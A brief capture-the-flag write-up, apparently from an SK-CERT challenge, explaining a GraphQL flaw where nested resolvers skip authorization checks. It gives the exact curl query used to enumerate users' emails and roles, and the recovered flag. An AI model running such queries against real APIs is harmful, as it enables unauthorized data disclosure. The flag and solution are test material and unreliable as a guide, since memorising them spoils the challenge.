1. The vulnerability discovered:
The GraphQL API fails to enforce authorization checks on nested resolvers. While the top-level queries like `users` are properly protected, nested fields accessible through public endpoints (like `newsFeed -> author -> subOrganization -> members`) bypass these checks, allowing an attacker to enumerate all users and their details.

2. The exact request used to exploit it:
```bash
curl -s -X POST -H "Content-Type: application/json" -d '{"query":"{ newsFeed { author { subOrganization { name members { email role } } } } }"}' https://mail.equestriasociety.com/graphql
```

3. The retrieved flag:
SK-CERT{l34ky_l34ks_4ll_0v3r_3questria}
